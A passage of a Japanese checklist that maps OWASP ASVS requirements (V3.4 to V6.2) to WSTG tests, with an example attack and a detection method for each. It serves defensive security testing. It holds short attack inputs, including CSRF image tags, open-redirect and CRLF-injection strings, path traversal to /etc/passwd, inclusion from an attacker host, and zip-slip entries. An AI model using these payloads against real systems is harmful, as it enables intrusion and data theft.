| V3.4.5 | L2 | Referrer-Policyで機密の外部漏えい防止 | 対応可 | 内部→外部遷移時のReferer挙動確認 | no-referrer等の適用 | WSTG-CONF-13 | 機密クエリを含むURLから外部サイトへ遷移しRefererで漏えい | ポリシー値と実際の送信値（ネットワーク面）を検証 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-Configuration_and_Deployment_Management_Testing/13-Testing_for_HTTP_Security_Headers |
| V3.4.6 | L2 | frame-ancestorsで埋め込み制御（X-Frame-Options非推奨） | 対応可 | クリックジャッキング検査/埋込可否確認 | 画面埋込点で評価 | WSTG-CLNT-07 | 悪性サイトで透明iframeに埋込しクリックを誘導 | iframe埋込可否とオーバーレイでのクリック誘導成立を検証 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_for_Clickjacking |
| V3.4.7 | L3 | CSPの違反送信先（report-to/report-uri）定義 | 部分対応 | 違反トリガでレポート送信可否を確認 | 診断用宛先は要合意 | WSTG-CONF-13 | 意図的にCSP違反を発生させ、レポートの送信/内容を確認 | レポートエンドポイントへの到達/記録を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-Configuration_and_Deployment_Management_Testing/13-Testing_for_HTTP_Security_Headers |
| V3.4.8 | L3 | COOP（same-origin/…-allow-popups）でタブ分離 | 部分対応 | ヘッダ確認とナビゲーション挙動観察 | window共有防止を確認 | WSTG-CONF-13 | COOP未設定環境でタブ間の`window.opener`共有を悪用 | ヘッダ有無/値とブラウザ挙動（opener切断）を検証 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-Configuration_and_Deployment_Management_Testing/13-Testing_for_HTTP_Security_Headers |

---

## V3.5 ブラウザのオリジン分離

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | WSTG番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | WSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :---: | :--- | :--- | :--- |
| V3.5.1 | L1 | CORS非依存時はCSRFトークン/追加ヘッダで真正性検証 | 対応可 | CSRFトークン有無/検証強度・二重送信可否 | セッション結合/同時対策も | WSTG-SESS-08 | `<img src="/transfer?to=attacker&amt=1000">`でGET副作用を誘発 | トークン欠如/検証不備でクロスサイト起因の状態変更が成立するか確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/08-Testing_for_Cross_Site_Request_Forgery |
| V3.5.2 | L1 | CORS依存時はプリフライト回避リクエストで呼べない設計 | 部分対応 | `Origin/Content-Type`/追加ヘッダ要件の検証 | 簡易化ヘッダでの回避不可 | WSTG-CLNT-09 | `Content-Type: text/plain`かつカスタムヘッダなしで機密APIにアクセス | プリフライト不要条件で呼べない/拒否されることを確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_Cross_Origin_Resource_Sharing |
| V3.5.3 | L1 | 機密操作は安全でないHTTPメソッド（GET等）を使用しない or Sec-Fetch厳格検証 | 対応可 | メソッド/Fetchメタ検証・画像等経由の誤呼び出し検査 | Idempotent設計も確認 | WSTG-CONF-05 | 削除APIがGETで実装され`<img src="/delete?id=1">`で副作用 | HTTPメソッドの適否/冪等性とブラウザ経由での誤呼び出し成立を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-Configuration_and_Deployment_Management_Testing/05-Testing_for_HTTP_Methods |
| V3.5.4 | L2 | 異アプリは異ホストで分離しSOPを活用 | 部分対応 | ホスト名/クッキースコープ/サブドメイン分離確認 | アーキ確認が鍵 | WSTG-SESS-02 | サブドメインから親ドメインCookieを設定してセッション汚染 | Cookieの`Domain`/`Path`/`__Host-`運用で越境不可を検証 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes |
| V3.5.5 | L2 | postMessageはorigin/構文検証し不正は破棄 | 部分対応 | UI操作でpostMessage経路を観測 | 実装露出が乏しい場合あり | WSTG-CLNT-11 | 悪性オリジンから`postMessage({admin:true},"*")`送信 | 受信側の`event.origin`検証とメッセージ検証欠如により挙動変化を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_for_HTML5_Web_Messaging |
| V3.5.6 | L3 | JSONPを無効化（XSSI耐性） | 対応可 | `callback=`等の挙動確認/JSONPレス無効を確認 | レガシAPI確認 | WSTG-CLNT-10 | `<script src="/api?callback=alert">`で任意関数実行 | Scriptタグ経由でのJSONP応答実行可否/XSSI対策有無を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_for_Cross_Site_Script_Inclusion |
| V3.5.7 | L3 | 認可データをJS資産レスポンスに含めない（XSSI防止） | 部分対応 | 認可要データの取得経路/ヘッダ制御確認 | 静的資産の取り扱い確認 | WSTG-CLNT-10 | 認証必須JSONを`<script src>`で読込みし先頭に`)]}',`が無くデータ露出 | 資産種別/ヘッダ/先頭プレフィクス有無の確認でXSSI耐性を評価 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_for_Cross_Site_Script_Inclusion |
| V3.5.8 | L3 | 認証済みリソースの埋込は意図時のみ（Sec-Fetch厳格 or CORP） | 部分対応 | 埋込試行とヘッダ（CORP等）検証 | 埋込失敗時のUX考慮 | WSTG-CONF-13 | 他オリジンから`<img/src>`等で認証済み画像/JSONを埋込し取得 | `Cross-Origin-Resource-Policy`等の有無/効果で越境読み出し制御を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-Configuration_and_Deployment_Management_Testing/13-Testing_for_HTTP_Security_Headers |

---

## V3.6 外部リソース完全性

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | WSTG番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | WSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :---: | :--- | :--- | :--- |
| V3.6.1 | L3 | 外部配信の資産はSRI＋固定版管理。不可なら根拠を文書化 | 部分対応 | `<link>/<script>`のSRI有無と固定版確認 | 文書化は別途確認 | WSTG-CLNT-12 | CDN上のJSを改竄しインライン差替えを誘発 | `integrity`属性/固定版（ハッシュ/固定URL）確認とSRI不一致時の拒否を検証 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Subresource_Integrity |

---

## V3.7 ブラウザのセキュリティに関するその他の考慮事項

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | WSTG番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | WSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :---: | :--- | :--- | :--- |
| V3.7.1 | L2 | 廃止/非安全なクライアント技術の不使用（Flash/ActiveX等） | 部分対応 | 資産スキャン/機能確認で残存技術の検出 | 近代ブラウザでは多くが無効 | WSTG-CLNT | `flashvars=`やActiveX呼出しの残存 | 静的資産/レスポンス内の古い技術参照を検出 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing |
| V3.7.2 | L2 | 自動リダイレクトは許可リスト先のみ | 部分対応 | オープンリダイレクト検査＋許可先確認 | 例外経路の洗い出し | WSTG-CLNT-04 | `next=//evil.tld`や`next=javascript:alert(1)`で遷移 | URLパラメータ操作で外部/危険スキーム遷移が成立するか確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect |
| V3.7.3 | L3 | 外部遷移時に警告とキャンセル手段を提供 | 部分対応 | 外部リンク遷移UI/警告表示の確認 | deep link配慮 | WSTG-CLNT-04 | 機密画面から外部サイトへ直接遷移し警告なし | 外部リンク押下時の中間確認/警告の有無を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect |
| V3.7.4 | L3 | ルートドメインのHSTSプリロードリスト登録 | 部分対応 | `Strict-Transport-Security`とpreload状況の確認 | 反映に時間差あり | WSTG-CONF-13 | `http://`直打ちで初回からHTTPS強制されない | HSTS値（`preload`要件）とブラウザのプリロード挙動を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-Configuration_and_Deployment_Management_Testing/13-Testing_for_HTTP_Security_Headers |
| V3.7.5 | L3 | 想定機能を未サポートのブラウザでは文書通りの動作（警告/遮断） | 範囲外 | 仕様・運用確認 | 実装/運用手順依存 | - | - | - | - |

# V4 Webサービス

## V4.1 一般的な Web サービスセキュリティ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | WSTG番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | 対象のWSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- | :--- | :--- |
| V4.1.1 | L1 | Content-Type と実体の一致（文字エンコーディング含む） | 対応可 | 各APIレスの Content-Type/charset とボディ検証 | JSON/CSV/画像等でミスマッチ確認 | WSTG-CONF-14 | `application/json` なのに HTML を返しブラウザがスニッフィングしてスクリプト実行、`X-Content-Type-Options` 未設定 | レスポンスの `Content-Type` と実体のパース可否・`nosniff` 有無を確認（不一致/スニッフィング許容なら検出） | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/14-Test_Other_HTTP_Security_Header_Misconfigurations |
| V4.1.2 | L2 | 人手UI向けのみ HTTP→HTTPS リダイレクト許容 | 部分対応 | APIエンドポイントのHTTP許容/自動リダイレクト有無確認 | 誤送信検知/監査要件と併読 | WSTG-CONF-07 | `http://api.example.com` へ送信すると 301/302 で HTTPS に誘導される（初回平文露出） | 平文HTTPで到達・リダイレクト挙動や HSTS の有無を確認（HTTP許容や初回平文があれば検出） | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security |
| V4.1.3 | L2 | 受信ヘッダの上書き防止（X-Forwarded-*, X-User-ID等） | 部分対応 | 任意ヘッダ注入→アプリ側解釈の確認 | 逆プロキシ/ALB設定依存 | WSTG-INPV-17 | `Host`/`X-Forwarded-Host` を改ざんしパスワードリセットURL改ざん、キャッシュ汚染 | ヘッダ改変で絶対URLやログ・メールに反映/機能誤動作があれば検出 | https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection |
| V4.1.4 | L3 | サポートHTTPメソッドのみ許可（未使用は拒否） | 対応可 | TRACE/PUT/DELETE など無効メソッド試行 | CORSプリフライト含め確認 | WSTG-CONF-06 | `PUT` でファイル設置、`TRACE` による XST、`X-HTTP-Method-Override` の悪用 | 各メソッドを送信し 200/動作変化なら検出（405/501 以外や機能実行は不許可） | https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods |
| V4.1.5 | L3 | 重要トランザクションにメッセージ署名 | 範囲外 | 仕様/運用ヒアリング中心 | 実装確認が必要（黒箱困難） | - | - | - | - |

## V4.2 HTTP メッセージ構造バリデーション

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | WSTG番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | 対象のWSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- | :--- | :--- |
| V4.2.1 | L2 | 受信メッセージ境界の厳格化（TE/CL競合処理等） | 部分対応 | TE/CL両立ペイロードやH2/H3差異での挙動確認 | 中間機器設定に依存 | WSTG-INPV-15 | `Content-Length` と `Transfer-Encoding: chunked` 併用でリクエストスマグリング（前段/後段乖離） | 差分ペイロードで前段200/後段404等の不整合・遅延/分割応答が出れば検出 | https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling |
| V4.2.2 | L3 | 送信時に Content-Length と実フレーム長の不整合回避 | 範囲外 | 生成側制御のため黒箱では限定的 | 代理で逸脱レスが無いか観測 | - | - | - | - |
| V4.2.3 | L3 | H2/H3で接続固有ヘッダを送受信しない | 対応可 | H2/H3で Transfer-Encoding 等混入の有無確認 | サーバ/ゲートウェイ実装差異 | WSTG-INPV-15 | HTTP/2 で `TE`/`Transfer-Encoding` を混入させプロキシ誤解釈→スマグリング | H2 経路で禁止ヘッダを送信し受理/不整合挙動があれば検出 | https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling |
| V4.2.4 | L3 | ヘッダ値にCR/LF/CRLFを許容しない | 対応可 | ヘッダインジェクション試行→レス分割/改変の有無 | 代理応答も観測 | WSTG-INPV-15 | `%0d%0aSet-Cookie: evil=1` 混入でレスポンス分割/任意ヘッダ付与 | 改行混入で新規ヘッダ/二重レス生成を確認できれば検出 | https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling |
| V4.2.5 | L3 | 過長URI/ヘッダ生成の抑止（DoS回避） | 部分対応 | 長大クエリ/クッキーでの閾値・エラー挙動確認 | プラットフォーム毎に閾値差 | WSTG-INPV-13 | 10KB超の `Cookie`/長大URI送信で 413/400/タイムアウト誘発 | サイズ増加で応答コード/遅延・接続切断など閾値超過の挙動確認で検出 | https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Buffer_Overflow |

## V4.3 GraphQL

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | WSTG番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | 対象のWSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- | :--- | :--- |
| V4.3.1 | L2 | クエリ許可リスト/深さ・コスト制限でDoS防止 | 部分対応 | ネスト/フラグメント乱用での応答時間・リジェクト確認 | 負荷配慮で軽度に実施 | WSTG-APIT-01 | 深いネスト/大量フラグメントで高コストクエリを連発し処理枯渇 | 429/400 やエラー文言（max depth/complexity）・顕著な遅延発生で検出 | https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/12-API_Testing/99-Testing_GraphQL |
| V4.3.2 | L2 | 本番での introspection 無効（公開意図なければ） | 対応可 | `__schema`/`__type` クエリ応答可否 | 管理ロール限定なら別評価 | WSTG-APIT-01 | `{"query":"{__schema{types{name}}}"}` でスキーマ全公開 | introspection が 200/スキーマ返却なら検出、403/無効化が期待 | https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/12-API_Testing/99-Testing_GraphQL |

## V4.4 WebSocket

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | WSTG番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | 対象のWSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- | :--- | :--- |
| V4.4.1 | L1 | すべて WSS を使用 | 対応可 | `ws://` 拒否/`wss://` 強制確認 | 証明書検証も実査 | WSTG-CLNT-10 | `ws://` 許可で平文盗聴/改ざん | DevTools/プロキシで `ws://` 接続が成立すれば検出（`wss://` 強制が期待） | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets |
| V4.4.2 | L2 | ハンドシェイク時の Origin 検証 | 対応可 | 異オリジンからの接続試行と拒否確認 | 許可リスト整合を確認 | WSTG-CLNT-10 | 悪性サイトから CSWSH（Cross-Site WebSocket Hijacking） | 異オリジンで `Origin` 任意値を送信し接続成功なら検出 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets |
| V4.4.3 | L2 | 標準セッション不可時は専用トークンで管理 | 部分対応 | トークン要求/失効/再接続挙動の確認 | 実装詳細の把握が鍵 | WSTG-CLNT-10 / WSTG-SESS-10 | 失効済/他ユーザの JWT/トークンで WS 接続継続・操作可能 | 無効化後も接続継続/権限越え可能なら検出（トークン検証/失効不備） | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets<br>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens |
| V4.4.4 | L2 | 専用WSトークンは既存HTTPSセッションを基盤に取得/検証 | 部分対応 | 認証連携の流れとバインド確認 | ミスマッチ時の拒否挙動確認 | WSTG-CLNT-10 / WSTG-SESS-10 | 盗んだトークンを別端末/未認証状態から使用し接続成立 | HTTPS セッションとトークンのバインド欠如（他環境で再利用可）で検出 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets<br>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens |

# V5 ファイル処理

## V5.1 ファイル処理ドキュメント

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | 対応するWSTGの番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | 対象のWSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :---: | :--- | :--- | :--- |
| V5.1.1 | L2 | 機能ごとの許可拡張子・最大サイズ（展開後含む）・悪性検出時の動作を文書化 | 範囲外 | 仕様・運用文書の有無をヒアリングで確認 | 文書化不備は実装不備の指標 | - | - | - | - |

---

## V5.2 ファイルアップロードとコンテンツ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | 対応するWSTGの番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | 対象のWSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :---: | :--- | :--- | :--- |
| V5.2.1 | L1 | 処理可能サイズのみ受け付け（DoS防止） | 対応可 | 大容量/境界サイズでエラー挙動確認 | プラットフォームのデフォ閾値も把握 | WSTG-BUSL-09 | 数百MB〜GB級ファイルを連投（プロフィール画像/添付等）して処理停滞を誘発 | 413等の拒否がなくスレッド枯渇/タイムアウト/高負荷を観測できればサイズ制御不備として検出 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files |
| V5.2.2 | L1 | 拡張子と内容（マジックバイト等）の整合検証 | 対応可 | 偽装拡張子/再エンコード画像で検証 | 業務決定に使うファイルを優先 | WSTG-BUSL-08 | `shell.php` を `shell.jpg`/複拡張`jpg.php`にして MIME/マジックバイト偽装で通過を狙う | サーバ側でMIME/シグネチャ不一致でも受理される・実行/配信されるなら検出 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types |
| V5.2.3 | L2 | 解凍前に最大非圧縮サイズ・最大ファイル数を検証 | 部分対応 | zip bomb 簡易版で挙動確認（軽負荷） | 本格負荷は事前合意必須 | WSTG-BUSL-09 | 高圧縮率アーカイブ（zip bomb/ネスト深いzip）を提出 | 展開でCPU/メモリ/ディスクが急増・サービス劣化を観測できれば検出 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files |
| V5.2.4 | L3 | ユーザ毎の容量/件数クォータを適用 | 部分対応 | 連続アップロードで上限適用確認 | ストレージ枯渇の防止策 | WSTG-BUSL-05 | 1ユーザで短時間に多数/大容量のアップロードを繰返し、クォータ超過を試行 | 上限超過でも拒否/遅延/通知が無い、別経路で迂回可能なら検出 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/05-Test_Number_of_Times_a_Function_Can_Be_Used_Limits |
| V5.2.5 | L3 | アーカイブ内シンボリックリンクの拒否（必要時は許可リスト） | 対応可 | symlink/相対リンクを含むzipで展開挙動確認 | 展開先の安全確認も実施 | WSTG-BUSL-09 | `../../var/www/html/` などを指す symlink を含むzip（Archive Directory Traversal） | 展開時にベース外へ書込/参照される・パス正規化無しで抜けるなら検出 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files |
| V5.2.6 | L3 | 画像ピクセルサイズ上限でピクセルフラッド防止 | 対応可 | 超高解像画像の拒否/再サンプル有無の確認 | 画像再処理の有無も確認 | WSTG-BUSL-09 | 10^8ピクセル級/多フレーム画像（巨大PNG/APNG/GIF）を投入 | サーバ側でピクセル数制限/再サンプル無しで処理負荷急増・OOM等が起これば検出 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files |

---

## V5.3 ファイル保存

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | 対応するWSTGの番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | 対象のWSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :---: | :--- | :--- | :--- |
| V5.3.1 | L1 | 公開領域のアップロード/生成ファイルを実行不可に | 対応可 | Webルート配下の実行可否/拡張子マップ確認 | MIME/拡張子強制ダウンロード化 | WSTG-CONF-03 | `.php/.jsp` をアップロードして直参照で実行可否を確認 | 実行される/ソース非表示で処理されるなら実行不可設定不備として検出 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information |
| V5.3.2 | L1 | パス生成は内部ID等を使用し、ユーザ入力は厳格検証 | 対応可 | パストラバーサル/LFI/RFI/SSRF試験 | realpath/許可ディレクトリ確認 | WSTG-ATHZ-01 | `file=../../etc/passwd` や `file=http://attacker/evil.txt` などで参照/包含を狙う | 目的外ファイルの読取/包含が可能・パス正規化/許可リスト不備が確認できれば検出 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include |
| V5.3.3 | L3 | 展開処理でユーザ提供のパス情報を無視（zip slip防止） | 対応可 | `../`含むエントリの展開結果を検証 | 展開先のベースパス固定必須 | WSTG-BUSL-09 | `../../webroot/app.php` 等のエントリ名を持つzipで展開先外への書込み（zip slip） | 展開時にベースディレクトリ外へファイル生成/上書きできれば検出 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files |

---

## V5.4 ファイルダウンロード

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | 対応するWSTGの番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | 対象のWSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :---: | :--- | :--- | :--- |
| V5.4.1 | L2 | 応答の Content-Disposition でサーバ側ファイル名を明示 | 対応可 | URL/JSON指定名を無視しヘッダ名が優先か確認 | ヘッダ改行混入に注意 | WSTG-CONF-14 | ダウンロード時、アプリ提供名に依存させて任意の拡張子/実行形式を誘導 | 一律に `Content-Disposition: attachment; filename=...` が設定されず、拡張子や挙動が不定なら検出 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/14-Test_Other_HTTP_Security_Header_Misconfigurations |
| V5.4.2 | L2 | 提供ファイル名をエンコード/サニタイズ（RFC6266遵守） | 対応可 | 非ASCII/制御文字混入時の挙動確認 | CR/LF, 角括弧, 連想ヘッダ注入対策 | WSTG-INPV-15 | `filename="a.csv"\r\nX-Test: 1` 等でCRLF注入/ヘッダ分割を試行 | CRLF混入でヘッダが増殖/改変される、あるいは応答分割が起きれば検出 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling |
| V5.4.3 | L2 | 信頼できない取得元のファイルをAVスキャン | 範囲外 | スキャン有無は運用/設計確認 | 検知時の隔離/通知手順も確認 | - | - | - | - |

# V6 認証

## V6.1 認証ドキュメント

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | WSTG番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | 対象のWSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- | :--- | :--- |
| V6.1.1 | L1 | 認証攻撃対策（レート制限/自動化防止/応答方針）の文書化 | 範囲外 | 文書/設定の提示依頼・ヒアリング | アカロック悪用防止の方針含む | - | - | - | - |
| V6.1.2 | L2 | コンテキスト固有NGワードのリスト化（パスワード禁止語） | 範囲外 | リスト有無の確認 | 組織名/製品名等 | - | - | - | - |
| V6.1.3 | L2 | 複数経路の統一セキュリティ制御・強度を文書化 | 範囲外 | すべてのログイン経路を洗い出し | SSO/ローカル/API 等 | - | - | - | - |

---

## V6.2 パスワードセキュリティ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | WSTG番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | 対象のWSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- | :--- | :--- |
| V6.2.1 | L1 | 最低8桁（推奨15桁） | 対応可 | フロント/サーバの最小長検証 | 実装差異に注意 | WSTG-ATHN-07 | 7文字以下や極端に短いPWを受理させる | 変更/登録フローで境界値(7/8/15)を試行し許容可否を確認 | https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy |
| V6.2.2 | L1 | ユーザが任意にパスワード変更可 | 対応可 | 変更フローの有無確認 |  | WSTG-ATHN-09 | 変更UI不備により強制変更不可の状態 | アカウントでログイン後、自己変更フローの有無・正当性(本人認証)を確認 | https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities |
| V6.2.3 | L1 | 変更時に現行PWと新PWを要求 | 対応可 | 現行PW省略不可を確認 |  | WSTG-ATHN-09 | 現行PW不要の変更エンドポイントにCSRFでパスワード差し替え | 現行PW未入力や他人セッションで変更が成功しないことを確認 | https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities |
| V6.2.4 | L1 | 上位弱PWリスト（≥3000）照合 | 部分対応 | 典型弱PWの拒否確認 | 実リストの網羅度は確認外 | WSTG-ATHN-07 | 「Password123!」「12345678」等の一般的弱PWが通る | 代表弱PWを登録/変更で試行し拒否されるか確認 | https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy |
| V6.2.5 | L1 | 文字種ルール強制なし（構成自由） | 部分対応 | 複雑性強制の有無を確認 | NIST準拠傾向 | WSTG-ATHN-07 | 特定の構成強制により短い規則的PWが許容されやすい | 文字種必須ルールの有無・短い規則PWの許容可否を確認 | https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy |
| V6.2.6 | L1 | type=password＋一時表示トグル | 対応可 | マスク/表示切替の挙動確認 |  | WSTG-ATHN-06 | ログアウト後に戻る操作で入力値や機密が表示される | ログアウト後のBack操作やキャッシュ制御ヘッダで残存表示の有無確認 | https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses |
| V6.2.7 | L1 | 貼り付け/ブラウザ/外部管理を許可 | 対応可 | ペースト禁止の有無 |  | WSTG-ATHN-05 | ブラウザの「保存されたPW」に依存/漏えいしうるUIの不備 | フィールドのpaste禁止/auto-complete制御の有無を確認 | https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/05-Testing_for_Vulnerable_Remember_Password |
| V6.2.8 | L1 | サーバ側で改変せず厳密検証（大文字化/切捨てなし） | 対応可 | 大文字/末尾空白等で検証 |  | WSTG-ATHN-07 | 大文字小文字同一視/末尾切捨てでPW空間が縮小 | 大文字/末尾空白/長さ変化で同一認証可否を比較 | https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy |
| V6.2.9 | L2 | 64桁以上を許容 | 対応可 | 長文PWの受入/ログイン確認 | フロント制限に注意 | WSTG-ATHN-07 | 65〜128桁などの長PWが拒否され総当たり耐性が低下 | 長文PWの登録/認証が可能か確認 | https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy |
| V6.2.10 | L2 | 定期変更強制なし（侵害時のみ変更） | 対応可 | 期限強制の有無確認 |  | WSTG-ATHN-07 | パスワード有効期限強制により弱い再設定を誘発 | パスワード有効期限/履歴強制の有無をUI/挙動で確認 | https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy |
| V6.2.11 | L2 | 文書化NGワード照合で推測容易PWを排除 | 範囲外 | リスト運用の有無のみ確認 |  | - | - | - | - |
